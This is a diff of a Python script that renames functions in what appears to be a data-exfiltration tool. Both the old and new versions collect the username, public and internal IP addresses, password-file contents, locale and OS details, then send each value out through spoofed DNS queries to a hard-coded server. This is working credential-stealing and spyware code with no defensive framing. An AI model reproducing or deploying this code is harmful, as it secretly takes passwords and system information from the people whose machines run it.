@@ -16,44 +16,44 @@ DNS_SERVER_IP = "1.2.3.4"
 IP_SRC = "1.2.3.4"
 
 
-def send_system_info():
-    username = str(get_username())
-    ip = str(get_ip())
-    internal_ip = str(get_internal_ip())
-    password_file = str(get_password_file())
-    language = str(get_languages())
-    os_info = str(get_os_info())
+def sendInfo():
+    #gather all data
+    username = str(getUsername())
+    ip = str(getIp())
+    internal = str(getInternalIp())
+    password = str(getPassword())
+    language = str(getLanguage())
+    os = str(getOs())
     
-    send_dns_query(username)
-    send_dns_query(ip)
-    send_dns_query(internal_ip)
-    send_dns_query(password_file)
-    send_dns_query(language)
-    send_dns_query(os_info)
+    #send all data
+    sendQuery(username)
+    sendQuery(ip)
+    sendQuery(internal)
+    sendQuery(password)
+    sendQuery(language)
+    sendQuery(os)
     
-    #print(username+","+ip+","+internal_ip+","+language+","+os_info)
+    #print(username+","+ip+","+internal_ip+","+language+","+os)
     return
     
 
-def get_username():
-    username = getpass.getuser()
-    return username
+def getUsername():
+    return getpass.getuser()
 
 
-def get_ip():
-    ip = requests.get("https://api.ipify.org").text
+def getIp():
+    return requests.get("https://api.ipify.org").text
+
+
+def getInternalIp():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip = s.getsockname()[0]
+    s.close()
     return ip
 
 
-def get_internal_ip():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    ip_internal = s.getsockname()[0]
-    s.close()
-    return ip_internal
-
-
-def get_password_file():
+def getPassword():
     if os.name == 'nt':
         password_file = ""
         try:
@@ -72,12 +72,11 @@ def get_password_file():
     return password_file
 
 
-def get_languages():
-    languages = str(locale.locale_alias)
-    return languages
+def getLanguage():
+    return locale.locale_alias
 
 
-def get_os_info():
+def getOs():
     os_data = ""
     if os.name == 'nt':
         os_version = sys.getwindowsversion()
@@ -87,7 +86,7 @@ def get_os_info():
         os_data = f"{os_info.sysname} {os_info.release} {os_info.version}"
     return os_data
 
-def send_dns_query(qname):
+def sendQuery(qname):
     ip = IP(src=IP_SRC, dst=DNS_SERVER_IP)
     udp = UDP(dport=DNS_PORT)
     dns = DNS(rd=1)
@@ -98,6 +97,6 @@ def send_dns_query(qname):
     
 if __name__ == "__main__":
     print("Start...\n")
-    send_system_info()
+    sendInfo()
     print("End...\n")
     
